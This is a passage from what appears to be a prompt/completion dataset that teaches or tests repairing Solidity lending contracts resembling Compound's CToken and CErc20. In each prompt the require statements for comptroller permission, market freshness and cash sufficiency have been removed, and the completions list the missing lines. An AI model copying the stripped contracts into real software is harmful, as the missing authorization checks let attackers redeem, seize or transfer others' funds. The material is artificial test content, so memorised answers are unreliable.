input\");\n\n380         /* Get the allowance, infinite for the account owner */\n381         uint256 startingAllowance = 0;\n382         if (spender == src) {\n383             startingAllowance = uint256(-1);\n384         } else {\n385             startingAllowance = transferAllowances[src][spender];\n386         }\n\n387         /* Do the calculations, checking for {under,over}flow */\n388         accountTokens[src] = sub_(accountTokens[src], tokens);\n389         accountTokens[dst] = add_(accountTokens[dst], tokens);\n390         if (collateralTokens > 0) {\n391             accountCollateralTokens[src] = sub_(accountCollateralTokens[src], collateralTokens);\n392             accountCollateralTokens[dst] = add_(accountCollateralTokens[dst], collateralTokens);\n\n393             emit UserCollateralChanged(src, accountCollateralTokens[src]);\n394             emit UserCollateralChanged(dst, accountCollateralTokens[dst]);\n395         }\n\n396         /* Eat some of the allowance (if necessary) */\n397         if (startingAllowance != uint256(-1)) {\n398             transferAllowances[src][spender] = sub_(startingAllowance, tokens);\n399         }\n\n400         /* We emit a Transfer event */\n401         emit Transfer(src, dst, tokens);\n\n402         comptroller.transferVerify(address(this), src, dst, tokens);\n\n403         return uint256(Error.NO_ERROR);\n404     }\n\n405     /**\n406      * @notice Get the account's cToken balances\n407      * @param account The address of the account\n408      */\n409     function getCTokenBalanceInternal(address account) internal view returns (uint256) {\n410         if (isCollateralTokenInit[account]) {\n411             return accountCollateralTokens[account];\n412         } else {\n413             /**\n414              * If the value of accountCollateralTokens was not initialized, we should return the value of accountTokens.\n415              */\n416             return accountTokens[account];\n417         }\n418     }\n\n419     /**\n420      * @notice Increase user's collateral. Increase as much as we can.\n421      * @param account The address of the account\n422      * @param amount The amount of collateral user wants to increase\n423      * @return The actual increased amount of collateral\n424      */\n425     function increaseUserCollateralInternal(address account, uint256 amount) internal returns (uint256) {\n426         uint256 totalCollateralTokensNew = add_(totalCollateralTokens, amount);\n427         if (collateralCap == 0 || (collateralCap != 0 && totalCollateralTokensNew <= collateralCap)) {\n428             // 1. If collateral cap is not set,\n429             // 2. If collateral cap is set but has enough space for this user,\n430             // give all the user needs.\n431             totalCollateralTokens = totalCollateralTokensNew;\n432             accountCollateralTokens[account] = add_(accountCollateralTokens[account], amount);\n\n433             emit UserCollateralChanged(account, accountCollateralTokens[account]);\n434             return amount;\n435         } else if (collateralCap > totalCollateralTokens) {\n436             // If the collateral cap is set but the remaining cap is not enough for this user,\n437             // give the remaining parts to the user.\n438             uint256 gap = sub_(collateralCap, totalCollateralTokens);\n439             totalCollateralTokens = add_(totalCollateralTokens, gap);\n440             accountCollateralTokens[account] = add_(accountCollateralTokens[account], gap);\n\n441             emit UserCollateralChanged(account, accountCollateralTokens[account]);\n442             return gap;\n443         }\n444         return 0;\n445     }\n\n446     /**\n447      * @notice Decrease user's collateral. Reject if the amount can't be fully decrease.\n448      * @param account The address of the account\n449      * @param amount The amount of collateral user wants to decrease\n450      */\n451     function decreaseUserCollateralInternal(address account, uint256 amount) internal {\n452         /*\n453          * Return if amount is zero.\n454          * Put behind `redeemAllowed` for accuring potential COMP rewards.\n455          */\n456         if (amount == 0) {\n457             return;\n458         }\n\n459         totalCollateralTokens = sub_(totalCollateralTokens, amount);\n460         accountCollateralTokens[account] = sub_(accountCollateralTokens[account], amount);\n\n461         emit UserCollateralChanged(account, accountCollateralTokens[account]);\n462     }\n\n463     struct MintLocalVars {\n464         uint256 exchangeRateMantissa;\n465         uint256 mintTokens;\n466         uint256 actualMintAmount;\n467     }\n\n468     /**\n469      * @notice User supplies assets into the market and receives cTokens in exchange\n470      * @dev Assumes interest has already been accrued up to the current block\n471      * @param minter The address of the account which is supplying the assets\n472      * @param mintAmount The amount of the underlying asset to supply\n473      * @param isNative The amount is in native or not\n474      * @return (uint, uint) An error code (0=success, otherwise a failure, see ErrorReporter.sol), and the actual mint amount.\n475      */\n476     function mintFresh(\n477         address minter,\n478         uint256 mintAmount,\n479         bool isNative\n480     ) internal returns (uint256, uint256) {\n481         // Make sure accountCollateralTokens of `minter` is initialized.\n482         initializeAccountCollateralTokens(minter);\n\n483         /* Fail if mint not allowed */\n484         require(comptroller.mintAllowed(address(this), minter, mintAmount) == 0, \"comptroller rejection\");\n\n485         /*\n486          * Return if mintAmount is zero.\n487          * Put behind `mintAllowed` for accuring potential COMP rewards.\n488          */\n489         if (mintAmount == 0) {\n490             return (uint256(Error.NO_ERROR), 0);\n491         }\n\n  \n492         MintLocalVars memory vars;\n\n493         vars.exchangeRateMantissa = exchangeRateStoredInternal();\n\n494         /////////////////////////\n495         // EFFECTS & INTERACTIONS\n496         // (No safe failures beyond this point)\n\n497         /*\n498          *  We call `doTransferIn` for the minter and the mintAmount.\n499          *  Note: The cToken must handle variations between ERC-20 and ETH underlying.\n500          *  `doTransferIn` reverts if anything goes wrong, since we can't be sure if\n501          *  side-effects occurred. The function returns the amount actually transferred,\n502          *  in case of a fee. On success, the cToken holds an additional `actualMintAmount`\n503          *  of cash.\n504          */\n505         vars.actualMintAmount = doTransferIn(minter, mintAmount, isNative);\n\n506         /*\n507          * We get the current exchange rate and calculate the number of cTokens to be minted:\n508          *  mintTokens = actualMintAmount / exchangeRate\n509          */\n510         vars.mintTokens = div_ScalarByExpTruncate(vars.actualMintAmount, Exp({mantissa: vars.exchangeRateMantissa}));\n\n511         /*\n512          * We calculate the new total supply of cTokens and minter token balance, checking for overflow:\n513          *  totalSupply = totalSupply + mintTokens\n514          *  accountTokens[minter] = accountTokens[minter] + mintTokens\n515          */\n516         totalSupply = add_(totalSupply, vars.mintTokens);\n517         accountTokens[minter] = add_(accountTokens[minter], vars.mintTokens);\n\n518         /*\n519          * We only allocate collateral tokens if the minter has entered the market.\n520          */\n521         if (ComptrollerInterfaceExtension(address(comptroller)).checkMembership(minter, CToken(this))) {\n522             increaseUserCollateralInternal(minter, vars.mintTokens);\n523         }\n\n524         /* We emit a Mint event, and a Transfer event */\n525         emit Mint(minter, vars.actualMintAmount, vars.mintTokens);\n526         emit Transfer(address(this), minter, vars.mintTokens);\n\n527         /* We call the defense hook */\n528         comptroller.mintVerify(address(this), minter, vars.actualMintAmount, vars.mintTokens);\n\n529         return (uint256(Error.NO_ERROR), vars.actualMintAmount);\n530     }\n\n531     struct RedeemLocalVars {\n532         uint256 exchangeRateMantissa;\n533         uint256 redeemTokens;\n534         uint256 redeemAmount;\n535     }\n\n536     /**\n537      * @notice User redeems cTokens in exchange for the underlying asset\n538      * @dev Assumes interest has already been accrued up to the current block. Only one of redeemTokensIn or redeemAmountIn may be non-zero and it would do nothing if both are zero.\n539      * @param redeemer The address of the account which is redeeming the tokens\n540      * @param redeemTokensIn The number of cTokens to redeem into underlying\n541      * @param redeemAmountIn The number of underlying tokens to receive from redeeming cTokens\n542      * @param isNative The amount is in native or not\n543      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n544      */\n545     function redeemFresh(\n546         address payable redeemer,\n547         uint256 redeemTokensIn,\n548         uint256 redeemAmountIn,\n549         bool isNative\n550     ) internal returns (uint256) {\n551         // Make sure accountCollateralTokens of `redeemer` is initialized.\n552         initializeAccountCollateralTokens(redeemer);     \n\n553         RedeemLocalVars memory vars;\n\n554         /* exchangeRate = invoke Exchange Rate Stored() */\n555         vars.exchangeRateMantissa = exchangeRateStoredInternal();\n\n556         /* If redeemTokensIn > 0: */\n557         if (redeemTokensIn > 0) {\n558             /*\n559              * We calculate the exchange rate and the amount of underlying to be redeemed:\n560              *  redeemTokens = redeemTokensIn\n561              *  redeemAmount = redeemTokensIn x exchangeRateCurrent\n562              */\n563             vars.redeemTokens = redeemTokensIn;\n564             vars.redeemAmount = mul_ScalarTruncate(Exp({mantissa: vars.exchangeRateMantissa}), redeemTokensIn);\n565         } else {\n566             /*\n567              * We get the current exchange rate and calculate the amount to be redeemed:\n568              *  redeemTokens = redeemAmountIn / exchangeRate\n569              *  redeemAmount = redeemAmountIn\n570              */\n571             vars.redeemTokens = div_ScalarByExpTruncate(redeemAmountIn, Exp({mantissa: vars.exchangeRateMantissa}));\n572             vars.redeemAmount = redeemAmountIn;\n573         }\n\n574         /**\n575          * For every user, accountTokens must be greater than or equal to accountCollateralTokens.\n576          * The buffer between the two values will be redeemed first.\n577          * bufferTokens = accountTokens[redeemer] - accountCollateralTokens[redeemer]\n578          * collateralTokens = redeemTokens - bufferTokens\n579          */\n580         uint256 bufferTokens = sub_(accountTokens[redeemer], accountCollateralTokens[redeemer]);\n581         uint256 collateralTokens = 0;\n582         if (vars.redeemTokens > bufferTokens) {\n583             collateralTokens = vars.redeemTokens - bufferTokens;\n584         }\n \n585         /* Verify market's block number equals current block number */\n586         require(accrualBlockNumber == getBlockNumber(), \"market not fresh\");\n\n      \n587         /////////////////////////\n588         // EFFECTS & INTERACTIONS\n589         // (No safe failures beyond this point)\n\n590         /*\n591          * We calculate the new total supply and redeemer balance, checking for underflow:\n592          *  totalSupplyNew = totalSupply - redeemTokens\n593          *  accountTokensNew = accountTokens[redeemer] - redeemTokens\n594          */\n595         totalSupply = sub_(totalSupply, vars.redeemTokens);\n596         accountTokens[redeemer] = sub_(accountTokens[redeemer], vars.redeemTokens);\n\n597         /*\n598          * We only deallocate collateral tokens if the redeemer needs to redeem them.\n599          */\n600         decreaseUserCollateralInternal(redeemer, collateralTokens);\n\n601         /*\n602          * We invoke doTransferOut for the redeemer and the redeemAmount.\n603          *  Note: The cToken must handle variations between ERC-20 and ETH underlying.\n604          *  On success, the cToken has redeemAmount less of cash.\n605          *  doTransferOut reverts if anything goes wrong, since we can't be sure if side effects occurred.\n606          */\n607         doTransferOut(redeemer, vars.redeemAmount, isNative);\n\n608         /* We emit a Transfer event, and a Redeem event */\n609         emit Transfer(redeemer, address(this), vars.redeemTokens);\n610         emit Redeem(redeemer, vars.redeemAmount, vars.redeemTokens);\n\n611         /* We call the defense hook */\n612         comptroller.redeemVerify(address(this), redeemer, vars.redeemAmount, vars.redeemTokens);\n\n613         return uint256(Error.NO_ERROR);\n614     }\n\n615     /**\n616      * @notice Transfers collateral tokens (this market) to the liquidator.\n617      * @dev Called only during an in-kind liquidation, or by liquidateBorrow during the liquidation of another CToken.\n618      *  Its absolutely critical to use msg.sender as the seizer cToken and not a parameter.\n619      * @param seizerToken The contract seizing the collateral (i.e. borrowed cToken)\n620      * @param liquidator The account receiving seized collateral\n621      * @param borrower The account having collateral seized\n622      * @param seizeTokens The number of cTokens to seize\n623      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n624      */\n625     function seizeInternal(\n626         address seizerToken,\n627         address liquidator,\n628         address borrower,\n629         uint256 seizeTokens\n630     ) internal returns (uint256) {\n631         // Make sure accountCollateralTokens of `liquidator` and `borrower` are initialized.\n632         initializeAccountCollateralTokens(liquidator);\n633         initializeAccountCollateralTokens(borrower);\n\n634         /* Fail if seize not allowed */\n635         require(\n636             comptroller.seizeAllowed(address(this), seizerToken, liquidator, borrower, seizeTokens) == 0,\n637             \"comptroller rejection\"\n638         );\n\n639         /*\n640          * Return if seizeTokens is zero.\n641          * Put behind `seizeAllowed` for accuring potential COMP rewards.\n642          */\n643         if (seizeTokens == 0) {\n644             return uint256(Error.NO_ERROR);\n645         }\n\n646         /* Fail if borrower = liquidator */\n647         require(borrower != liquidator, \"invalid account pair\");\n\n648         /*\n649          * We calculate the new borrower and liquidator token balances and token collateral balances, failing on underflow/overflow:\n650          *  accountTokens[borrower] = accountTokens[borrower] - seizeTokens\n651          *  accountTokens[liquidator] = accountTokens[liquidator] + seizeTokens\n652          *  accountCollateralTokens[borrower] = accountCollateralTokens[borrower] - seizeTokens\n653          *  accountCollateralTokens[liquidator] = accountCollateralTokens[liquidator] + seizeTokens\n654          */\n655         accountTokens[borrower] = sub_(accountTokens[borrower], seizeTokens);\n656         accountTokens[liquidator] = add_(accountTokens[liquidator], seizeTokens);\n657         accountCollateralTokens[borrower] = sub_(accountCollateralTokens[borrower], seizeTokens);\n658         accountCollateralTokens[liquidator] = add_(accountCollateralTokens[liquidator], seizeTokens);\n\n659         /* Emit a Transfer, UserCollateralChanged events */\n660         emit Transfer(borrower, liquidator, seizeTokens);\n661         emit UserCollateralChanged(borrower, accountCollateralTokens[borrower]);\n662         emit UserCollateralChanged(liquidator, accountCollateralTokens[liquidator]);\n\n663         /* We call the defense hook */\n664         comptroller.seizeVerify(address(this), seizerToken, liquidator, borrower, seizeTokens);\n\n665         return uint256(Error.NO_ERROR);\n666     }\n667 }",
        "completion": "44+   require(err == 0, \"mint failed\");\n190+  require(\n            receiver.onFlashLoan(initiator, underlying, amount, totalFee, data) ==\n                keccak256(\"ERC3156FlashBorrowerInterface.onFlashLoan\"),\n            \"IERC3156: Callback failed\"\n        );\n194+ require(cashOnChainAfter == add_(cashOnChainBefore, totalFee), \"BALANCE_INCONSISTENT\");\n206+ require(msg.sender == address(comptroller), \"comptroller only\");\n217+ require(msg.sender == address(comptroller), \"comptroller only\");\n491+ require(accrualBlockNumber == getBlockNumber(), \"market not fresh\");\n552+  require(redeemTokensIn == 0 || redeemAmountIn == 0, \"bad input\");\n584+  require(comptroller.redeemAllowed(address(this), redeemer, collateralTokens) == 0, \"comptroller rejection\");\n586+  require(getCashPrior() >= vars.redeemAmount, \"insufficient cash\");\n"
    },
    {
        "prompt": "1 pragma solidity ^0.5.16;\n\n2 import \"./CToken.sol\";\n\n3 /**\n4  * @title Compound's CErc20 Contract\n5  * @notice CTokens which wrap an EIP-20 underlying\n6  * @author Compound\n7  */\n8 contract CErc20 is CToken, CErc20Interface {\n9     /**\n10      * @notice Initialize the new money market\n11      * @param underlying_ The address of the underlying asset\n12      * @param comptroller_ The address of the Comptroller\n13      * @param interestRateModel_ The address of the interest rate model\n14      * @param initialExchangeRateMantissa_ The initial exchange rate, scaled by 1e18\n15      * @param name_ ERC-20 name of this token\n16      * @param symbol_ ERC-20 symbol of this token\n17      * @param decimals_ ERC-20 decimal precision of this token\n18      */\n19     function initialize(\n20         address underlying_,\n21         ComptrollerInterface comptroller_,\n22         InterestRateModel interestRateModel_,\n23         uint256 initialExchangeRateMantissa_,\n24         string memory name_,\n25         string memory symbol_,\n26         uint8 decimals_\n27     ) public {\n28         // CToken initialize does the bulk of the work\n29         super.initialize(comptroller_, interestRateModel_, initialExchangeRateMantissa_, name_, symbol_, decimals_);\n\n30         // Set underlying and sanity check it\n31         underlying = underlying_;\n32         EIP20Interface(underlying).totalSupply();\n33     }\n\n34     /*** User Interface ***/\n\n35     /**\n36      * @notice Sender supplies assets into the market and receives cTokens in exchange\n37      * @dev Accrues interest whether or not the operation succeeds, unless reverted\n38      * @param mintAmount The amount of the underlying asset to supply\n39      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n40      */\n41     function mint(uint256 mintAmount) external returns (uint256) {\n42         (uint256 err, ) = mintInternal(mintAmount, false);\n       \n43     }\n\n44     /**\n45      * @notice Sender redeems cTokens in exchange for the underlying asset\n46      * @dev Accrues interest whether or not the operation succeeds, unless reverted\n47      * @param redeemTokens The number of cTokens to redeem into underlying\n48      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n49      */\n50     function redeem(uint256 redeemTokens) external returns (uint256) {\n51        _;\n52     }\n\n53     /**\n54      * @notice Sender redeems cTokens in exchange for a specified amount of underlying asset\n55      * @dev Accrues interest whether or not the operation succeeds, unless reverted\n56      * @param redeemAmount The amount of underlying to redeem\n57      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n58      */\n59     function redeemUnderlying(uint256 redeemAmount) external returns (uint256) {\n60             _;\n61     }\n\n62     /**\n63      * @notice Sender borrows assets from the protocol to their own address\n64      * @param borrowAmount The amount of the underlying asset to borrow\n65      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n66      */\n67     function borrow(uint256 borrowAmount) external returns (uint256) {\n68          _;\n69     }\n\n70     /**\n71      * @notice Sender repays their own borrow\n72      * @param repayAmount The amount to repay\n73      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n74      */\n75     function repayBorrow(uint256 repayAmount) external returns (uint256) {\n76         (uint256 err, ) = repayBorrowInternal(repayAmount, false);\n       \n77     }\n\n78     /**\n79      * @notice Sender repays a borrow belonging to borrower\n80      * @param borrower the account with the debt being payed off\n81      * @param repayAmount The amount to repay\n82      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n83      */\n84     function repayBorrowBehalf(address borrower, uint256 repayAmount) external returns (uint256) {\n85         (uint256 err, ) = repayBorrowBehalfInternal(borrower, repayAmount, false);        \n86     }\n\n87     /**\n88      * @notice The sender liquidates the borrowers collateral.\n89      *  The collateral seized is transferred to the liquidator.\n90      * @param borrower The borrower of this cToken to be liquidated\n91      * @param repayAmount The amount of the underlying borrowed asset to repay\n92      * @param cTokenCollateral The market in which to seize collateral from the borrower\n93      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n94      */\n95     function liquidateBorrow(\n96         address borrower,\n97         uint256 repayAmount,\n98         CTokenInterface cTokenCollateral\n99     ) external returns (uint256) {\n100         (uint256 err, ) = liquidateBorrowInternal(borrower, repayAmount, cTokenCollateral, false);\n       \n101     }\n\n102     /**\n103      * @notice The sender adds to reserves.\n104      * @param addAmount The amount fo underlying token to add as reserves\n105      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n106      */\n107     function _addReserves(uint256 addAmount) external returns (uint256) {\n108         _;\n109     }\n\n110     /*** Safe Token ***/\n\n111     /**\n112      * @notice Gets balance of this contract in terms of the underlying\n113      * @dev This excludes the value of the current message, if any\n114      * @return The quantity of underlying tokens owned by this contract\n115      */\n116     function getCashPrior() internal view returns (uint256) {\n117         EIP20Interface token = EIP20Interface(underlying);\n118         return token.balanceOf(address(this));\n119     }\n\n120     /**\n121      * @dev Similar to EIP20 transfer, except it handles a False result from `transferFrom` and reverts in that case.\n122      *      This will revert due to insufficient balance or insufficient allowance.\n123      *      This function returns the actual amount received,\n124      *      which may be less than `amount` if there is a fee attached to the transfer.\n125      *\n126      *      Note: This wrapper safely handles non-standard ERC-20 tokens that do not return a value.\n127      *            See here: https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca\n128      */\n129     function doTransferIn(\n130         address from,\n131         uint256 amount,\n132         bool isNative\n133     ) internal returns (uint256) {\n134         isNative; // unused\n\n135         EIP20NonStandardInterface token = EIP20NonStandardInterface(underlying);\n136         uint256 balanceBefore = EIP20Interface(underlying).balanceOf(address(this));\n137         token.transferFrom(from, address(this), amount);\n\n138         bool success;\n139         assembly {\n140             switch returndatasize()\n141             case 0 {\n142                 // This is a non-standard ERC-20\n143                 success := not(0) // set success to true\n144             }\n145             case 32 {\n146                 // This is a compliant ERC-20\n147                 returndatacopy(0, 0, 32)\n148                 success := mload(0) // Set `success = returndata` of external call\n149             }\n150             default {\n151                 // This is an excessively non-compliant ERC-20, revert.\n152                 revert(0, 0)\n153             }\n154         }       \n\n155         // Calculate the amount that was *actually* transferred\n156         uint256 balanceAfter = EIP20Interface(underlying).balanceOf(address(this));\n157         return sub_(balanceAfter, balanceBefore);\n158     }\n\n159     /**\n160      * @dev Similar to EIP20 transfer, except it handles a False success from `transfer` and returns an explanatory\n161      *      error code rather than reverting. If caller has not called checked protocol's balance, this may revert due to\n162      *      insufficient cash held in this contract. If caller has checked protocol's balance prior to this call, and verified\n163      *      it is >= amount, this should not revert in normal conditions.\n164      *\n165      *      Note: This wrapper safely handles non-standard ERC-20 tokens that do not return a value.\n166      *            See here: https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca\n167      */\n168     function doTransferOut(\n169         address payable to,\n170         uint256 amount,\n171         bool isNative\n172     ) internal {\n173         isNative; // unused\n\n174         EIP20NonStandardInterface token = EIP20NonStandardInterface(underlying);\n175         token.transfer(to, amount);\n\n176         bool success;\n177         assembly {\n178             switch returndatasize()\n179             case 0 {\n180                 // This is a non-standard ERC-20\n181                 success := not(0) // set success to true\n182             }\n183             case 32 {\n184                 // This is a complaint ERC-20\n185                 returndatacopy(0, 0, 32)\n186                 success := mload(0) // Set `success = returndata` of external call\n187             }\n188             default {\n189                 // This is an excessively non-compliant ERC-20, revert.\n190                 revert(0, 0)\n191             }\n192         }\n193     }\n\n194     /**\n195      * @notice Transfer `tokens` tokens from `src` to `dst` by `spender`\n196      * @dev Called by both `transfer` and `transferFrom` internally\n197      * @param spender The address of the account performing the transfer\n198      * @param src The address of the source account\n199      * @param dst The address of the destination account\n200      * @param tokens The number of tokens to transfer\n201      * @return Whether or not the transfer succeeded\n202      */\n203     function transferTokens(\n204         address spender,\n205         address src,\n206         address dst,\n207         uint256 tokens\n208     ) internal returns (uint256) {\n209         /* Fail if transfer not allowed */\n        \n   \n210         /* Get the allowance, infinite for the account owner */\n211         uint256 startingAllowance = 0;\n212         if (spender == src) {\n213             startingAllowance = uint256(-1);\n214         } else {\n215             startingAllowance = transferAllowances[src][spender];\n216         }\n\n217         /* Do the calculations, checking for {under,over}flow */\n218         accountTokens[src] = sub_(accountTokens[src], tokens);\n219         accountTokens[dst] = add_(accountTokens[dst], tokens);\n\n220         /* Eat some of the allowance (if necessary) */\n221         if (startingAllowance != uint256(-1)) {\n222             transferAllowances[src][spender] = sub_(startingAllowance, tokens);\n223         }\n\n224         /* We emit a Transfer event */\n225         emit Transfer(src, dst, tokens);\n\n226         comptroller.transferVerify(address(this), src, dst, tokens);\n\n227         return uint256(Error.NO_ERROR);\n228     }\n\n229     /**\n230      * @notice Get the account's cToken balances\n231      * @param account The address of the account\n232      */\n233     function getCTokenBalanceInternal(address account) internal view returns (uint256) {\n234         return accountTokens[account];\n235     }\n\n236     struct MintLocalVars {\n237         uint256 exchangeRateMantissa;\n238         uint256 mintTokens;\n239         uint256 actualMintAmount;\n240     }\n\n241     /**\n242      * @notice User supplies assets into the market and receives cTokens in exchange\n243      * @dev Assumes interest has already been accrued up to the current block\n244      * @param minter The address of the account which is supplying the assets\n245      * @param mintAmount The amount of the underlying asset to supply\n246      * @param isNative The amount is in native or not\n247      * @return (uint, uint) An error code (0=success, otherwise a failure, see ErrorReporter.sol), and the actual mint amount.\n248      */\n249     function mintFresh(\n250         address minter,\n251         uint256 mintAmount,\n252         bool isNative\n253     ) internal returns (uint256, uint256) {\n\n254         /*\n255          * Return if mintAmount is zero.\n256          * Put behind `mintAllowed` for accuring potential COMP rewards.\n257          */\n258         if (mintAmount == 0) {\n259             return (uint256(Error.NO_ERROR), 0);\n260         }\n\n      \n\n261         MintLocalVars memory vars;\n\n262         vars.exchangeRateMantissa = exchangeRateStoredInternal();\n\n263         /////////////////////////\n264         // EFFECTS & INTERACTIONS\n265         // (No safe failures beyond this point)\n\n266         /*\n267          *  We call `doTransferIn` for the minter and the mintAmount.\n268          *  Note: The cToken must handle variations between ERC-20 and ETH underlying.\n269          *  `doTransferIn` reverts if anything goes wrong, since we can't be sure if\n270          *  side-effects occurred. The function returns the amount actually transferred,\n271          *  in case of a fee. On success, the cToken holds an additional `actualMintAmount`\n272          *  of cash.\n273          */\n274         vars.actualMintAmount = doTransferIn(minter, mintAmount, isNative);\n\n275         /*\n276          * We get the current exchange rate and calculate the number of cTokens to be minted:\n277          *  mintTokens = actualMintAmount / exchangeRate\n278          */\n279         vars.mintTokens = div_ScalarByExpTruncate(vars.actualMintAmount, Exp({mantissa: vars.exchangeRateMantissa}));\n\n280         /*\n281          * We calculate the new total supply of cTokens and minter token balance, checking for overflow:\n282          *  totalSupply = totalSupply + mintTokens\n283          *  accountTokens[minter] = accountTokens[minter] + mintTokens\n284          */\n285         totalSupply = add_(totalSupply, vars.mintTokens);\n286         accountTokens[minter] = add_(accountTokens[minter], vars.mintTokens);\n\n287         /* We emit a Mint event, and a Transfer event */\n288         emit Mint(minter, vars.actualMintAmount, vars.mintTokens);\n289         emit Transfer(address(this), minter, vars.mintTokens);\n\n290         /* We call the defense hook */\n291         comptroller.mintVerify(address(this), minter, vars.actualMintAmount, vars.mintTokens);\n\n292         return (uint256(Error.NO_ERROR), vars.actualMintAmount);\n293     }\n\n294     struct RedeemLocalVars {\n295         uint256 exchangeRateMantissa;\n296         uint256 redeemTokens;\n297         uint256 redeemAmount;\n298         uint256 totalSupplyNew;\n299         uint256 accountTokensNew;\n300     }\n\n301     /**\n302      * @notice User redeems cTokens in exchange for the underlying asset\n303      * @dev Assumes interest has already been accrued up to the current block. Only one of redeemTokensIn or redeemAmountIn may be non-zero and it would do nothing if both are zero.\n304      * @param redeemer The address of the account which is redeeming the tokens\n305      * @param redeemTokensIn The number of cTokens to redeem into underlying\n306      * @param redeemAmountIn The number of underlying tokens to receive from redeeming cTokens\n307      * @param isNative The amount is in native or not\n308      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n309      */\n310     function redeemFresh(\n311         address payable redeemer,\n312         uint256 redeemTokensIn,\n313         uint256 redeemAmountIn,\n314         bool isNative\n315     ) internal returns (uint256) {\n       \n316         RedeemLocalVars memory vars;\n\n317         /* exchangeRate = invoke Exchange Rate Stored() */\n318         vars.exchangeRateMantissa = exchangeRateStoredInternal();\n\n319         /* If redeemTokensIn > 0: */\n320         if (redeemTokensIn > 0) {\n321             /*\n322              * We calculate the exchange rate and the amount of underlying to be redeemed:\n323              *  redeemTokens = redeemTokensIn\n324              *  redeemAmount = redeemTokensIn x exchangeRateCurrent\n325              */\n326             vars.redeemTokens = redeemTokensIn;\n327             vars.redeemAmount = mul_ScalarTruncate(Exp({mantissa: vars.exchangeRateMantissa}), redeemTokensIn);\n328         } else {\n329             /*\n330              * We get the current exchange rate and calculate the amount to be redeemed:\n331              *  redeemTokens = redeemAmountIn / exchangeRate\n332              *  redeemAmount = redeemAmountIn\n333              */\n334             vars.redeemTokens = div_ScalarByExpTruncate(redeemAmountIn, Exp({mantissa: vars.exchangeRateMantissa}));\n335             vars.redeemAmount = redeemAmountIn;\n336         }\n\n \n337         /*\n338          * Return if redeemTokensIn and redeemAmountIn are zero.\n339          * Put behind `redeemAllowed` for accuring potential COMP rewards.\n340          */\n341         if (redeemTokensIn == 0 && redeemAmountIn == 0) {\n342             return uint256(Error.NO_ERROR);\n343         }\n\n344         /*\n345          * We calculate the new total supply and redeemer balance, checking for underflow:\n346          *  totalSupplyNew = totalSupply - redeemTokens\n347          *  accountTokensNew = accountTokens[redeemer] - redeemTokens\n348          */\n349         vars.totalSupplyNew = sub_(totalSupply, vars.redeemTokens);\n350         vars.accountTokensNew = sub_(accountTokens[redeemer], vars.redeemTokens);\n\n         \n351         /////////////////////////\n352         // EFFECTS & INTERACTIONS\n353         // (No safe failures beyond this point)\n\n354         /* We write previously calculated values into storage */\n355         totalSupply = vars.totalSupplyNew;\n356         accountTokens[redeemer] = vars.accountTokensNew;\n\n357         /*\n358          * We invoke doTransferOut for the redeemer and the redeemAmount.\n359          *  Note: The cToken must handle variations between ERC-20 and ETH underlying.\n360          *  On success, the cToken has redeemAmount less of cash.\n361          *  doTransferOut reverts if anything goes wrong, since we can't be sure if side effects occurred.\n362          */\n363         doTransferOut(redeemer, vars.redeemAmount, isNative);\n\n364         /* We emit a Transfer event, and a Redeem event */\n365         emit Transfer(redeemer, address(this), vars.redeemTokens);\n366         emit Redeem(redeemer, vars.redeemAmount, vars.redeemTokens);\n\n367         /* We call the defense hook */\n368         comptroller.redeemVerify(address(this), redeemer, vars.redeemAmount, vars.redeemTokens);\n\n369         return uint256(Error.NO_ERROR);\n370     }\n\n371     /**\n372      * @notice Transfers collateral tokens (this market) to the liquidator.\n373      * @dev Called only during an in-kind liquidation, or by liquidateBorrow during the liquidation of another CToken.\n374      *  Its absolutely critical to use msg.sender as the seizer cToken and not a parameter.\n375      * @param seizerToken The contract seizing the collateral (i.e. borrowed cToken)\n376      * @param liquidator The account receiving seized collateral\n377      * @param borrower The account having collateral seized\n378      * @param seizeTokens The number of cTokens to seize\n379      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n380      */\n381     function seizeInternal(\n382         address seizerToken,\n383         address liquidator,\n384         address borrower,\n385         uint256 seizeTokens\n386     ) internal returns (uint256) {\n\n387        /*\n388          * Return if seizeTokens is zero.\n389          * Put behind `seizeAllowed` for accuring potential COMP rewards.\n390          */\n391         if (seizeTokens == 0) {\n392             return uint256(Error.NO_ERROR);\n393         }\n394               /*\n395          * We calculate the new borrower and liquidator token balances, failing on underflow/overflow:\n396          *  borrowerTokensNew = accountTokens[borrower] - seizeTokens\n397          *  liquidatorTokensNew = accountTokens[liquidator] + seizeTokens\n398          */\n399         accountTokens[borrower] = sub_(accountTokens[borrower], seizeTokens);\n400         accountTokens[liquidator] = add_(accountTokens[liquidator], seizeTokens);\n\n401         /* Emit a Transfer event */\n402         emit Transfer(borrower, liquidator, seizeTokens);\n\n403         /* We call the defense hook */\n404         comptroller.seizeVerify(address(this), seizerToken, liquidator, borrower, seizeTokens);\n\n405         return uint256(Error.NO_ERROR);\n406     }\n407 }",
